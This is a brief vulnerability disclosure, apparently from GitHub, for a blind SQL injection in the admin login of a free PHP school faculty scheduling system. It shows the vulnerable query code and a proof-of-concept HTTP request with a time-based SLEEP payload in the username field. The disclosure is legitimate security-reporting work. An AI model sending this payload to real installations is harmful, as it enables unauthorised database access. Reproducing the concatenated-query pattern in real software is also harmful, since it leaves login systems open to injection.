# Blind SQL Injection in School Faculty Scheduling System

## Vendor Homepage:
> https://www.campcodes.com/projects/php/school-faculty-scheduling-system-using-php-mysql-free-download/

## Affected Component
> /admin/ajax.php

## Code
```php
	function login(){
			extract($_POST);		
			$qry = $this->db->query("SELECT * FROM users where username = '".$username."' and password = '".md5($password)."' ");
			if($qry->num_rows > 0){
				foreach ($qry->fetch_array() as $key => $value) {
					if($key != 'password' && !is_numeric($key))
						$_SESSION['login_'.$key] = $value;
				}
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /scheduling/admin/ajax.php?action=login HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 77
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/scheduling/admin/login.php
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin


username=admin'+AND+(SELECT+8611+FROM+(SELECT(SLEEP(7)))bDqT)--+-&password=xx
```

## Screenshot
![image](https://github.com/user-attachments/assets/d3f20849-a949-453e-8a81-b6c2faf7ef26)




## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
